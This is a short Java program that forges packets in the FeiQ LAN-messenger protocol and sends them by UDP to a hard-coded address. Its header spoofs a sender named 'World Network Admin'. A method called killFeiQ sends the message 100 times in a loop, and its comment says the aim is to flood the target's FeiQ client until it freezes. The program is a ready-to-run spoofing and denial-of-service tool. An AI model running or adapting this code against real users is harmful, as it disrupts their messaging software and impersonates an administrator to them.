package com.yu;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.UnknownHostException;

public class FeiQMessage {
		// 飞鸽报文
	private static String packet = "1_lbt4_10#32899#002481627512#0#0#0:1289671407:世界网管:666666-666666:288:";

	public static void main(String[] args) throws Exception {

		// sendMessage(getMyIpAddress() , "hello,world!" ); //给自己发个消息试试
		sendMessage("192.168.54.2", "hello,world!");

//		killFeiQ("192.168.54.2", "hello,world!");
	}

	/**
	 *
	 * @param ipAddress
	 *            目标ip地址
	 * @param message
	 *            给目标ip发送的消息
	 */
	public static void sendMessage(String ipAddress, String message) {


		String msg = packet + message;

		try {
			byte[] buf = msg.getBytes("GBK");

			InetAddress addr = InetAddress.getByName(ipAddress);
			int port = 2425;
			DatagramPacket send = new DatagramPacket(buf, buf.length, addr, port);

			DatagramSocket client = new DatagramSocket();
			client.send(send);
			// client.close();
		} catch (Exception e) {
			e.printStackTrace();
		}

	}

	/**
	 * 获取本机ip地址
	 *
	 * @return 返回获取的ip
	 */
	public static String getMyIpAddress() {
		try {
			InetAddress addr = InetAddress.getLocalHost();
			String ip = addr.getHostAddress().toString(); // 获取本机ip
			// System.out.println("本机IP：" + ip);
			return ip;
		} catch (UnknownHostException e) {
			e.printStackTrace();
		}
		return null;
	}

	/**
	 * 重复发送大量消息,造成飞秋卡死
	 *
	 * @param ipAddress
	 * @param message
	 */
	public static void killFeiQ(String ipAddress, String message) {
		for (int i = 0; i < 100; i++) {
			sendMessage(ipAddress, message);
		}
	}

}
